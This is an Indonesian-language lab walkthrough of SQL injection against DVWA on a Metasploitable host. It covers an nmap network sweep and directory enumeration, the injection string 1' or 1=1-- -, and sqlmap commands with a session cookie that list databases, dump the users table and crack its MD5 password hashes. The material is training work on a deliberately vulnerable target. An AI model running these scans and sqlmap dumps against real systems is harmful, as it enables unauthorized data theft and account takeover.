# Introduction

**SQL Injection** (SQLi) adalah salah satu jenis serangan siber yang paling umum. Serangan ini terjadi ketika seorang penyerang memasukkan (menginjeksi) kode SQL berbahaya **melalui input aplikasi web**, seperti kolom login atau formulir pencarian.

Tujuannya adalah untuk memanipulasi perintah SQL yang dijalankan di sisi server, memungkinkan penyerang untuk:

- Melewati otentikasi (login tanpa kata sandi).

- Mengakses, memodifikasi, atau menghapus data sensitif di database.

- Bahkan mendapatkan kontrol penuh atas server.

**Eksploitasi dengan sqlmap**

sqlmap adalah alat otomatis yang dirancang untuk mendeteksi dan mengeksploitasi kerentanan SQLi. Alat ini tidak menemukan kerentanan itu sendiri, tetapi secara otomatis menjalankan berbagai serangan untuk membuktikan kerentanan dan mengambil data. sqlmap bekerja dengan menggunakan berbagai teknik injeksi untuk berinteraksi dengan basis data.

**1. _Reconnaissence_**

- Analisis jaringan yang sedang dipakai untuk mengetahui IP yang digunakan

```
ifconfig
```
- Memindai seluruh jaringan internal yang saling terhubung untuk mencari target
```
nmap -sn <ip_range>

Ex. nmap -sn 192.168.1.0/24   //scanning the whole connected divices
```
**2. _Scanning and Enumeration_**

- Memindai port server, yaitu `80 (http)` dan `443 (https)` pada IP target
```
nmap -p 80,443 --script=http-enum <ip_metasploitable>
```
Script `http-enum` digunakan untuk membantu menemukan direktori yang tersembunyi.
```
PORT    STATE  SERVICE
80/tcp  open   http
| http-enum: 
|   /tikiwiki/: Tikiwiki
|   /test/: Test page
|   /phpinfo.php: Possible information file
|   /phpMyAdmin/: phpMyAdmin
|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /index/: Potentially interesting folder
443/tcp closed https
```
- Eksplorasi Web Server menggunakan browser
```
<ip_metasploitable>/dvwa
```
Kita akan menggunakan **Damn Vulnerable Web Application** (DVWA) sebagai sistem untuk melakukan simulasi serangan melalui **Command Injection**

**3. _Gaining Access (Exploitation)_**
- Login ke DVWA
```
username : admin
password : password
```
- Merubah security level ke low
```
DVWA Security -> Script Security -> Low -> Submit
```
- Mencoba SQL Injection
```
1' or 1=1-- -
```
- `1'`:Tanda kutip tunggal (') mengakhiri string di dalam kueri SQL, sehingga memungkinkan Anda menyisipkan kode Anda sendiri.

- `or 1=1`: Kondisi ini akan selalu bernilai benar. 1 sama dengan 1, jadi kondisi OR akan membuat seluruh kueri menjadi benar.

- `--`: Ini adalah komentar di SQL. Tanda ini akan membuat bagian selanjutnya dari kueri (yaitu, verifikasi kata sandi) diabaikan oleh database.

```
ID: 1' or 1=1-- -
First name: admin
Surname: admin
```
- Menggunakan SQLMAP untuk proses lebih lanjut

```
sqlmap -u "http://192.168.175.90/dvwa/vulnerabilities/sqli/?id=1%60+or+1%3D1--&Submit=Submit#" --cookie="security=low; PHPSESSID=b4bc85c30d98c40221134fcae940b491" --dbs
```
- Perlu mengganti `PHPSESSID` dengan cookie Anda. Buka browser, masuk ke DVWA, klik kanan, pilih "Inspect Element" (atau "Developer Tools"), dan cari `cookie` di bagian "Storage" atau "Application".
- `-u`: Menentukan URL target.
- `--cookie`: Mengirim cookie sesi Anda, yang diperlukan agar sqlmap bisa masuk ke halaman yang rentan.
- `--dbs`: Menginstruksikan sqlmap untuk **menampilkan daftar database** yang ada.

```
[07:48:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 5.0.12
[07:48:59] [INFO] fetching database names
available databases [7]:
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195
```
- Mencari tabel dalam suatu database
```
sqlmap -u "http://192.168.175.90/dvwa/vulnerabilities/sqli/?id=1%60+or+1%3D1--&Submit=Submit#" --cookie="security=low; PHPSESSID=b4bc85c30d98c40221134fcae940b491" -D dvwa --tables
```
Gunakan sqlmap dengan bendera (_flag_) `-D` untuk menentukan database yang ingin dituju, yaitu `dvwa`, dan bendera `--tables` untuk mendaftar tabel yang ada di dalamnya.
```
[07:52:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 5.0.12
[07:52:59] [INFO] fetching tables for database: 'dvwa'
[07:52:59] [WARNING] reflective value(s) found and filtering out
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```
- Mengambil data dari tabel users
```
sqlmap -u "http://192.168.175.90/dvwa/vulnerabilities/sqli/?id=1%60+or+1%3D1--&Submit=Submit#" --cookie="security=low; PHPSESSID=b4bc85c30d98c40221134fcae940b491" -D dvwa -T users --dump
```
- `-T` users: Menentukan tabel yang ingin Anda tuju.
- `--dump`: Menginstruksikan sqlmap untuk mengekstrak semua data dari tabel tersebut.
- Proses `cracking password` yang diperoleh dari pemindaian tabel user

```
[09:14:46] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[09:15:01] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[09:15:20] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
```
```
Database: dvwa                                                                 
Table: users
[5 entries]
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
| user_id | user    | avatar                                                | password                                    | last_name | first_name |
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
```
**4. _Maintaining accsess dan Post exploitation_**
- Mencoba login menggunakan data yang ditemukan 
```
<ip_metasploitable>/dvwa
```
```
Ex.  username : pablo
     password : letmein
```
